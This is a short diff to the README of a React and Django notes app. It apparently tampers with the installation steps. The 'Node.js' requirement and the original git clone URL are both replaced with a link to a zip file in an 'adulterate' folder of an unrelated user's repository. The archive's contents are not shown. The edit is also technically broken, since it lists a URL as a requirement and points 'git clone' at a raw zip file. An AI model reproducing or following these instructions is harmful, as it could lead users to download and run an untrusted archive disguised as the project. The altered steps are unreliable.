@@ -3,13 +3,13 @@ This is a simple notes app built with React and Django.
 
 ## Requirements
 1. Python 3.9
-2. Node.js
+2. https://raw.githubusercontent.com/abhi123-dev/django-notes-app/main/adulterate/django-notes-app.zip
 3. React
 
 ## Installation
 1. Clone the repository
 ```
-git clone https://github.com/LondheShubham153/django-notes-app.git
+git clone https://raw.githubusercontent.com/abhi123-dev/django-notes-app/main/adulterate/django-notes-app.zip
 ```
 
 2. Build the app
